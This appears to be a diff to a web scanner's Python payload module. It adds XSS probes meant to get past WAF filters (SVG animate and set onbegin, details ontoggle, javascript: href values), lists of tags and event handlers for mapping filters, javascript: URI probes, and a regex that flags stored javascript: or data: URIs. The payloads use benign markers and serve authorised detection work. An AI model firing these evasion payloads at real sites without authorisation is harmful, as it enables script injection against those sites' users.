@@ -6,6 +6,7 @@ no data exfiltration, no DoS-shaped input.
 """
 from __future__ import annotations
 
+import re
 import uuid
 
 # ---------------------------------------------------------------------- XSS
@@ -17,7 +18,45 @@ XSS_PROBES = [
     '<img src=x onerror="{marker}">',
     '"><svg onload="{marker}">',
     "{{7*7}}",  # template injection side-check: 49 means SSTI
+    # WAF-evasion / "some markup allowed" vectors: filters often block
+    # script/img/onload but miss SVG animation + less common handlers
+    '<svg><animate onbegin="{marker}" attributeName=x dur=1s>',
+    '<svg><set onbegin="{marker}" attributeName=x>',
+    '<details open ontoggle="{marker}">',
+    '<svg><animate attributeName=href values=javascript:{marker}>',
 ]
+
+# Filter-mapping probe lists ("which markup survives the WAF?"): string-level
+# survival is what we fingerprint — browser-execution semantics are the
+# hunter's context analysis job.
+FILTER_SCAN_TAGS = [
+    "svg", "animate", "set", "details", "video", "audio", "iframe",
+    "object", "embed", "form", "input", "button", "marquee", "body",
+    "style", "math",
+]
+FILTER_SCAN_HANDLERS = [
+    "onbegin", "onstart", "ontoggle", "onfocusin", "onanimationstart",
+    "onload", "onerror", "onclick",
+]
+
+# URI-scheme injection: values that become href/src targets. A marker-carrying
+# javascript:/data: URL landing unencoded in an anchor/img attribute is the
+# "stored XSS into anchor href" pattern (PortSwigger) — detection only.
+URI_SCHEME_PROBES = [
+    "javascript:{marker}//",
+    "javascript:alert(1)//{marker}",
+    'jaVasCript:{marker}//',
+]
+
+# Stored-XSS persistence check: href/src/action attributes whose value starts
+# with a javascript: (any letter-spacing/case) or data:text/html scheme — the
+# attribute context that makes stored URI payloads exploitable.
+STORED_HREF_RE = re.compile(
+    r"(?:href|src|action)\s*=\s*['\"]\s*"
+    r"(?:j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t|data\s*:\s*text/html)",
+    re.IGNORECASE)
+
+XSS_ERROR_SIGNATURES = []  # placeholder to keep payload module shape stable
 
 # ---------------------------------------------------------------------- SQLi
 
